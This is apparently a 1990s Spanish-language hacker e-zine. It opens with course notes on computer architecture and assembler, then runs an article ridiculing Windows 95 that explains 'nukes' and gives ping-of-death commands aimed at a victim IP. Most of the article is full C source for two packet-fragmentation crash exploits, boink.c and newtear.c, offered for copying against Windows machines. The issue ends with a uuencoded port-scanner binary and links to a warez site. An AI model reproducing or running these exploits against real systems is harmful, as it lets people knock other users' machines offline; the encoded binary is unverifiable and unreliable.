El procesador cuenta con una serie de celdas de memoria que se utilizan con mucha frecuencia y 
que, por ende, forman parte de la UCP. 

Estas celdas son conocidas con el nombre de registros.  Un procesador puede tener una docena o 
dos  de estos  registros.  La unidad  aritmetica y logica  de la UCP  realiza las  operaciones 
relacionadas  con los calculos numericos  y simbolicos. Tipicamente estas unidades solo tienen 
capacidad de efectuar operaciones  muy elementales como: suma y resta de  dos numeros de punto 
fijo,  multiplicacion y division de  punto fijo,  manipulacion  de bits  de  los  registros  y 
comparacion del contenido de dos registros.

Las computadoras personales pueden clasificarse  por lo que se conoce como tama~no de palabra, 
esto es, la cantidad de bits que el procesador puede manejar a la vez.


Memoria Central.

Es un  conjunto de  celdas (actualmente  fabricadas con semiconductores) usadas para  procesos 
generales, tales como la  ejecucion de programas y el  almacenamiento de informacion  para las 
operaciones.

Cada  una  de las celdas puede  contener  un  valor  numerico y tienen  la  propiedad  de  ser
direccionables, esto es,  que se pueden distinguir una de otra  por medio de un numero unico o
direccion para cada celda.

El nombre  generico de estas memorias es  Random Access Memory (Memoria de acceso aleatorio) o 
RAM  por sus siglas en ingles. La principal  desventaja de  este tipo de  memoria es  que  los 
circuitos  integrados pierden la informacion  que  tienen almacenada  cuando se interrumpe  la 
alimentacion  electrica. Esto llevo  a la creacion de  memorias cuya informacion  no se pierda 
cuando se apaga el sistema. Estas memorias reciben el  nombre de Read Only Memory  (Memoria de 
solo lectura) o ROM.

Unidades de Entrada y Salida.

Para que una computadora nos sea otil es necesario que el procesador se  comunique al exterior 
por  medio de  interfaces que permiten  la entrada  y la salida de  datos del  procesador y la 
memoria.  Haciendo  uso  de  estas   comunicaciones  es  posible  introducir   datos  para  su 
procesamiento y la posterior visualizacion de los datos ya procesados.

Algunas  de las unidades de  entrada mas  comunes son teclados,  lectoras de  tarjetas  (ya en 
desuso),  mouse, etc. Las  unidades de  salida mas comunes son  las terminales de video y  las 
impresoras.



Unidades de Memoria Auxiliar.

Como  la memoria central  de  una  computadora  es costosa y,  considerando  las  aplicaciones 
actuales,  muy limitada,  surge entonces  la necesidad de crear sistemas de  almacenamiento de 
informacion practicos y economicos. Ademas, la memoria central pierde su contenido al apagarse 
la maquina, por lo que no es conveniente utilizarla para almacenamiento permanente de datos.

Estos y  otros incovenientes dan  lugar a la creacion de unidades  perifericas  de memoria que 
reciben  el nombre  de memoria auxiliar o secundaria.  De estas unidades  perifericas  las mas 
comunes son las cintas y los discos magneticos.

La informacion  almacenada en estos medios magneticos  recibe el nombre de archivo. Un archivo 
esta formado por un nomero variable de registros,  generalmente de tama~no fijo; los registros 
pueden contener datos o programas.


Ventajas del Ensamblador


La primera razon para  trabajar con ensamblador  es que  proporciona la oportunidad de conocer 
mas a fondo la operacion de su PC, lo que permite el desarrollo de  software de una manera mas 
consistente.

La segunda razon es el control total de la PC que se tiene con el uso del mismo.

Otra razon es que los programas  de ensamblador son mas rapidos,  mas compactos y tienen mayor 
capacidad que los creados en otros lenguajes.

Por oltimo el ensamblador permite una optimizacion  ideal en los programas tanto en su tama~no 
como en su ejecucion.



Software


En terminos de  computacion es todo  aquel proceso o programa  que utiliza los  recursos de la 
computadora para lograr el objetivo trazado por su dise~nador o programador.


Conceptos basicos


Informacion en las computadoras.
     Unidades de informacion
     Sistemas numericos
     Convertir nomeros binarios a decimales
     Convertir nomeros decimales a binarios
     Sistema Hexadecimal

Metodos de representacion de datos en una computadora.
     Codigo ASCII
     Metodo BCD
     Representacion de punto flotante

Trabajando con el lenguaje ensamblador.
     Proceso de creacion de un programa
     Registros de la UCP
     La estructura del ensamblador
     Nuestro primer programa
     Guardar y cargar los programas
     Condiciones, ciclos y bifurcaciones
     Interrupciones


Unidades de informacion

Para que  la PC pueda  procesar la informacion es necesario  que esta  se encuentre en  celdas 
especiales llamadas registros.

Los registros son conjuntos de 8 o 16 flip-flops (basculadores o biestables).

Un  flip-flop es  un  dispositivo  capaz  de  almacenar  dos  niveles  de  voltaje,  uno bajo, 
regularmente  de 0.5 volts y  otro alto comunmente de 5 volts. El nivel bajo  de energia en el 
flip-flop se  interpreta como apagado o 0, y el nivel alto como prendido o 1.  A estos estados 
se  les  conoce usualmente  como bits, que son la  unidad mas  peque~na de  informacion en una 
computadora.

A un grupo de 16 bits se le conoce como palabra, una palabra puede ser dividida en grupos de 8 
bits llamados bytes, y a los grupos de 4 bits les llamamos nibbles.



                                                                      Derechos Reservados.1995                                      
                                                                    UNIVERSIDAD DE GUADALAJARA
                                              Coordinacion General de Sistemas de Informacion.

------------------------

?Un poco elemental? Digamos que con algo hay que empezar y sobre todo con algo sencillo, lo 
siento por los avanzados.


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
SEIS                                                                           Notas al margen
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Un poco de  lo que ya  todos conocemos:  Windows 95 y sus bondades... (y  codigo fuente de dos
nukes)
Este articulo es extractado de la revista Proyecto_R que se encuentra en:
http://www.bigfoot.com/~proyecto_r

------------------------

QUE LE VAMOS A HACER ES GUINDOWS I
_____________________________________________________________ By PlaXiuS


Una vez  prestando  servicios a un  usuario ,  me comento  que por lo menos una vez al  dia su 
pantalla se  ponia azul con algun  error medio extra~no que le  obligaba a resetear su equipo, 
cual era el problema . Yo le respondi que podian ser varios pero que lo chequearia; el usuario 
me contesto con tono burlezco .- pero como tantas cosas pueden ser??? a lo cual repuse.
--------"QUE LE VAMOS A HACER ES GUINDOWS" ..........
Recuerdan  que hace  algunos dias a don Billy  se  le colgo el guindoze 98  en una conferencia 
jajaj , (para que vea don tito la mugre de software que saca al mercado), pero ya habia pasado 
antes  en una  demostracion de  Guindoze  NT siii vieran  ustedes aquel papelon ,,,..QUE NT ES
ROBUSTO, QUE NT ES SEGURO , QUE NT AKI ALLA ... y se le cuelga en plena demostracion ...jajaja 
que guena ,.,,.
Bueno desgraciadamente  no  hay  otro sistema  operativo  que  los  usuarios  mortales  puedan 
utilizar... UNIX Y LINUX NO SON FACILES; costaria bastante cambiar al simple usuario a manejar 
otro entorno, ademas de la compatibilidad de softwarez de uso diario .
bueno  ahora pasemos  a lo que  todos quieren...  veamos  que  tan buenos  son estos  sistemas 
operativos ....

WINDOWS 95 

Bueno he aki el sistema operativo reinante en estos a~nos , veamos que tan potente es  :

Primero que  nada date una vuelta a Microsoft  a travez de la inet y te daras cuanta que  casi 
todos los dias sacan parches nuevos -...  eso deja claro que el sistema operativo es  como las 
weeeaas .

NUKES
Se  le llama  Nuke a  cualquier  tipo de  ataque que  se  haga a travez de paquetes TCP/IP,  a 
diferentes puertos, aprovechando los fallos de sistemas operativos y la docibilidad del TCP/IP 
ya que por ser un sistema abierto, permite cualquier tipo de cambios ;)) .

OOB Nuke.-
Los famosos winnuke,  popularisimo en IRC  se llama winnuke ya que solo afecta a  las maquinas 
que usa guindoze . El ataque consiste en mandarle el flag OOB que signifca fuera de banda (out 
of band) a algun puerto normalmente el 139 , produciendo asi un  lindo pantallazo azul con  el 
tipico mensaje de guindoze de volcado de pila , obligando al usuario a reiniciar su maquina... 
jejeje .- este bug esta ampliamente parchado .-
Si quereis chequear si estas protegido contra este nuke , haz lo siguiente... cierra todos los 
+ programas que puedas y entra en la siguiente direccion.- 
http://xuxa.gr.ssr.upm.es/cgi-bin/winnuke .-  si te caes ya sabes,  buscate el parche o prueba 
renombrando el archivo c:\windows\system\vnbt.386 por c:\windows\system\vnbt.bak .- 

ICMP Nuke
El icmp es  un subprotocolo  de IP,  que es el encargado de  informar los  errores  producidos 
durante la  transmision de paquetes, Ahora  aprovechando nuevamente que TCP/IP es un protocolo 
abierto que podemos  manejar a nuestro antojo (bueno no es  tan asi yo nunca he  modificado un 
paquete  a mano)  lo  que  hacemos  es mandar paquetes  con ICMP errors  a la vicitma  podemos  
desconectarlo de la red .

Ping de la Muerte 
Bueno la utilidad  ping es la encargada  de  verificar conexiones, tiempo de respuestas etc... 
ahora podemos adaptarlo para atacar  a alguien .... ;)) como???  muy simple podemos cambiar el 
tama~no de los  paquetes de tal  forma que la victima al momento de ordenarlos  para enviar la 
respuesta , ya  esta recibiendo el  otro paquete de  tal forma que se crea  un atochamiento de 
paquetes , de tal forma que no es capaz de mantenerse conectado y zapp se cae.-

desde guindoze seria de la sgte forma .-

c:\windows>ping -l 65510 <ip de la vicitma> -t

desde Unix seria .-

$ ping -s 32000 <direcc. IP> 


Problemas con impresion : Es sabido que cuando se manejan impresoras en Red  Novell  dentro de 
win95,  misteriosamente  desaparecen del  grupo  configuracion.  Ya me ha tocado  varias veces 
verificar  usuarios  que  no pueden  imprimir y cuando  se va a  verificar  el  estado de  las 
impresoras , Han desaparecido de la configuracion :- SOlucion RESETEO .-    

Incompatible  con novell: La verdad que  trabajar con  Novell y Windoze se  hace cada  vez mas 
dificil, ya  que el cliente para  redes Novell  de Microsoft,  no permite el funcionamiento de 
los script de inicio, los mapeos por defecto y lo que es peor no permite que el usuario cambie 
su password en novell . 
Solucion .- Instalar el Cliente32 de Novell pero este cliente te mas lento er Windoze(no se si 
a proposito) , y crea un lio en las password que el usuario pocas veces entiende , en especial 
si corres una red NT en paralelo .


Bueno este  es el primer  capitulo de  esta saga,  para la  proxima  esperamos  tener  algunas 
sorpresas sobre WIndoze NT y 95 , y quizas aparezca algun  articulillo de Mierdows 98 .-  pero 
no nos despediremos sin dejar con ustedes un par de codigos fuentes de un par de Nukes que son 
unas variantes del conocido Teardrop .

NOTA .- Estamos experimentando con  el archivo services de Guindoze  a ver si sacamos provecho 
de este y tal vez  encontramos algo entretenido  que se pueda hacer, pero  ya esta  abierta la 
idea, a trabajar se ha dicho .-


Copia el codigo entre los asteriscos , sin los asteriscos .-


****************Boink.c ********************************************************



/*
  boink.c - a modified bonk.c
    
    
                                ==bendi - 1998==

                        bonk.c        -         5/01/1998
        Based On: teardrop.c by route|daemon9 & klepto
        Crashes *patched* win95/(NT?) machines.

        
        
*/

#include <stdio.h>
#include <string.h>

#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>

#define FRG_CONST       0x3
#define PADDING         0x1c

struct udp_pkt
{
        struct iphdr    ip;
        struct udphdr   udp;
        char data[PADDING];
} pkt;

int     udplen=sizeof(struct udphdr),
        iplen=sizeof(struct iphdr),
        datalen=100,
        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
        spf_sck;                        /* Socket */

void usage(void)
{
        /* fprintf(stderr, "Usage: ./bonk <src_addr> <dst_addr> [num]\n"); */
        fprintf (stderr, "Usage: ./boink <src_addr> <dst_addr> <start_port> <stop_port> [num]\n");
        exit(0);
}

u_long host_to_ip(char *host_name)
{
        static  u_long ip_bytes;
        struct hostent *res;

        res = gethostbyname(host_name);
        if (res == NULL)
                return (0);
        memcpy(&ip_bytes, res->h_addr, res->h_length);
        return (ip_bytes);
}

void quit(char *reason)
{
        perror(reason);
        close(spf_sck);
        exit(-1);
}

int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
           int dst_prt)
{
        int     bs;
        struct  sockaddr_in to;

        memset(&pkt, 0, psize);
                                                /* Fill in ip header */
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;
        pkt.ip.frag_off = htons(0x2000);        /* more to come */

        pkt.udp.source = htons(src_prt);        /* udp header */
        pkt.udp.dest = htons(dst_prt);
        pkt.udp.len = htons(8 + PADDING);
                                                /* send 1st frag */

        to.sin_family = AF_INET;
        to.sin_port = src_prt;
        to.sin_addr.s_addr = dst_addr;

        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));

        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
        pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                        /* 2nd frag */

        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
                (struct sockaddr *) &to, sizeof(struct sockaddr));

        return bs;
}

void main(int argc, char *argv[])
{
        u_long  src_addr,
                dst_addr;

        int     i,
               /* src_prt = 55,
                  dst_prt = 55, */ 
                start_port,
                stop_port,
                bs = 1,
                pkt_count;

        if (argc < 5)
                usage();

        start_port = (u_short) atoi (argv[ 3 ]);
        stop_port = (u_short) atoi (argv[ 4 ]);        
        if (argc == 6)
              pkt_count = atoi (argv[ 5 ]);
        
        
        if (start_port >= stop_port ||
            stop_port <= start_port) {
                
                start_port = 25;
                stop_port = 65;
        
        }
        
            
        if (pkt_count == 0)	pkt_count = 10;
        
        /* Resolve hostnames */

        src_addr = host_to_ip(argv[1]);
        if (!src_addr)
                quit("bad source host");
        dst_addr = host_to_ip(argv[2]);
        if (!dst_addr)
                quit("bad target host");

        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (!spf_sck)
                quit("socket()");
        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
        sizeof(bs)) < 0)
                quit("IP_HDRINCL");

        for (i = 0; i < pkt_count; ++i)
        {
                int j;
                
                printf ("(%d)%s:%d->%d\n", i, argv[ 2 ], start_port, stop_port);
                
                for (j = start_port; j != stop_port; j++) {
                
                 /* fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt); */
                    fondle (spf_sck, src_addr, dst_addr, j, j);

                }
                usleep(10000);
        }

        printf("Done.\n");
}


*******************fin del boink.c*************************************************


Copia el codigo entre los asteriscos , sin los asteriscos .-



*******************newtear.c*********************************************************



/*  Newtear.c
 *  Seemingly, a new teardrop type exploit. Affects NT4, and Win95.
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define PADDING 0x14    /* datagram frame padding for first packet */ /* JD Change pad size to 20 decimal. */
#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
                         * withstand maybe 5 or 10 sometimes...  Experiment.
                         */
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;

    fprintf(stderr, "teardrop   route|daemon9\n\n");

    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 3) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }

    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    /*
     * Grab some memory for our packet, align p_ptr to point at the beginning
     * of our packet, and then fill it with zeros.
     */
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING); // Set it all to zero

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING*2);   /* UDP total length */ /* Increases UDP total length to 48 bytes
                                                     Which is too big! */

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    /*  We set the fragment offset to be inside of the previous packet's
     *  payload (it overlaps inside the previous packet) but do not include
     *  enough payload to cover complete the datagram.  Just the header will
     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
     *  better.
     */
    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
    *((u_short *)p_ptr) = FIX(MAGIC);

    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
            name);
    exit(0);
}

/* EOF */



******************** Fin de newtear.c ********************************************

************************************************************************
Cualquier comentario , critica o correccion a este articulo , por favor 
hacerla llegar a PlaXiuS : plaxius@bigfoot.com
Estamos abiertos a caulquier sugerencia
************************************************************************

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
SIETE                                                                                      Fin
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Bueno aqui quiero terminar...  se me hizo un poco  largo el  primer e-zine, y con un monton de
textos sacados de otras revistas.

Me despido  esperando sus colaboraciones y textos...  sus preguntas y sugerencias,  para  que, 
como dije, este e-zine sea un buen sitio de encuentro para el H/P/V/C/I colombiano.

Ah...  antes de que se  me olvide, mi pagina  con muchos  textos de  estos  (en  ingles  y  en 
espa~nol, pues estoy tratando de traducir la mayoria) es: 
http://www.warez.com/users/silence
o
http://travel.to/silence

En ella esta la subscripcion a una lista de correo para H/P en espa~nol... y en Colombia.

Gracias por ayudar...
                                                                                   mR. sILENCE
                                                                            mr.silence@usa.net
                                                                                 (otra vez...)


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
OCHO                                                                                       PGP
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

mR. sILENCE
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.0i for non-commercial use

mQGiBDZyl3sRBAD49tLlvtvsYKEKL7+dIh86ZM2W1xzd4IkNzPLkE+isf7UohuL6
CzFzVMp/bHqsTdvKlYYtseO1WQFSe8isnOlX//7RJ9SonXTME4EeShscHQTDbq0k
00sGc4XEghEMIs0X0g7uyeg4go8Tx/75FvbVHqCjFnmFQW+6kImO7yu29wCg/8JY
qKsGWL/FGHY3RgrC2rGAIiUD/2tp3AsC3V18RZXoLk3zAJrQIl8yS+Kq/hXcSgvM
XrPnHJbBUh7fn1DEaKx0pzaifQ5BOP3iDyjO9hxbo0B80/Z6uV7MlrVGLc9hQZLA
qFkL43/ZDK41sZ6tCQsFPJfp8lA2Fz1v/8Mk4lYPWYar6esrNXD74bhXwQrGWj+R
btk9A/9r5A3q59BFFLTSMRGGWGIswdo2KczpZPimkfj7BSvkctkQnzhlyJHSARYT
Iv1YnVYgIhxjAy/WzKhbNy8VNRrGj3zgabNhLDPXr7DRX03XQiLRpMNj4jtglXHZ
8YXJsRhCu1wAiH/CaUwwsctJ+xw7qQ4HoNrd7YYZRDwRDg1VMLQgTXIuIHNpbGVu
Y2UgPG1yLnNpbGVuY2VAdXNhLm5ldD6JAEsEEBECAAsFAjZyl3sECwMBAgAKCRC9
dP2/lyfK3RNhAKCKQ94tXKq6wPlx/4aJqifOx3Zu+ACfW03OMHqSz9DmMNyDiWM7
fpyxXqW5Ag0ENnKXexAIAPZCV7cIfwgXcqK61qlC8wXo+VMROU+28W65Szgg2gGn
VqMU6Y9AVfPQB8bLQ6mUrfdMZIZJ+AyDvWXpF9Sh01D49Vlf3HZSTz09jdvOmeFX
klnN/biudE/F/Ha8g8VHMGHOfMlm/xX5u/2RXscBqtNbno2gpXI61Brwv0YAWCvl
9Ij9WE5J280gtJ3kkQc2azNsOA1FHQ98iLMcfFstjvbzySPAQ/ClWxiNjrtVjLhd
ONM0/XwXV0OjHRhs3jMhLLUq/zzhsSlAGBGNfISnCnLWhsQDGcgHKXrKlQzZlp+r
0ApQmwJG0wg9ZqRdQZ+cfL2JSyIZJrqrol7DVekyCzsAAgIH/2ZPJj3ML2lobE92
I33qB0XMnwhuYLDlNxe2XakwZo46RunDkFuWVRjnyjJLZLVDDL34EeE4P11rVzNs
4Rf9odllHMhHmV8vXSbIdYPUTPzSjmkrNPUIHLHDWq/ZgM9FxekjGyA69nMXIoQ3
qqT4VD2Pn9rsnKEb8PO/Ujyhzot+YDglWsVIK96xPHlaVbqXGYKlUl93YLs5WOtN
K+NnaER13+dzJxKcQKTX4bbwEpKLgKKNlReWrGO/dhdQRjufoZ5yDTaOKzSVKn8M
G9AMDMBXYR8eokTc7iHtLuR0qYvQ4XJxr8sX3W11ntDFPdacB776x3o4cscjsGi7
ToFQmi+JAD8DBRg2cpd7vXT9v5cnyt0RAsCCAJ94J4+IuwFJ5+H85HVPNqYT831e
tQCfccH2HAdHbT4UmbMcDzlm24uTUw4=
=mR7J
-----END PGP PUBLIC KEY BLOCK-----

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
NUEVE                                                                             Aplicaciones
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Esta se las dejo de tarea...
Si no saben UUDECODE les toca aprender...

Esta  utilidad no  es lo que  llamarian "lo  ultimo en guaracha" pero si es util para escanear 
puertos en varias IP.

section 1 of uuencode 5.25 of file domscan.zip    by R.E.M.

begin 644 domscan.zip
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
